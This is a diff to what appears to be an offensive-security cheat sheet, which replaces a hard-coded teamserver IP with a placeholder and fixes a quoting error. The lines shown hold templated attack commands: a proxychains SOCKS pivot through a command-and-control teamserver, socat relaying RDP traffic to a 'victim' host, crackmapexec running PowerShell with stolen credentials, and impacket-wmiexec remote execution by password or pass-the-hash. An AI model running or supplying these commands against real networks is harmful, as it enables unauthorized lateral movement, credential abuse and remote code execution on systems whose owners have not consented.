@@ -8,7 +8,7 @@ mount -t cifs //<ip>//<share name/ /mnt/share -o username=<username>
 ------------------------
 On Kali:
 	Setup Proxychains to leverage pivot on PID 6336
-		socks4 64.69.57.203 9001
+		socks4 <external Teamserver IP> 9001
 	Setup socat through proxychains so it takes RDP requests and pushes them to the end victim
 		proxychains socat TCP-LISTEN:3389,fork TCP4:10.3.7.86:3389
 	Obtain IP address of local Kali system
@@ -56,7 +56,7 @@ cme smb -u <username> -p <password> -d <domain> <IP> -X '<powershell command>'
 **Remote Access**
 ------------------
 impacket-wmiexec <domain>/<user>:<password>@<IP>
-impacket-wmiexec <domain>/<user>@<IP> -hashes ":<hash>
+impacket-wmiexec <domain>/<user>@<IP> -hashes :<hash>
 
 **CS**
 --------------------
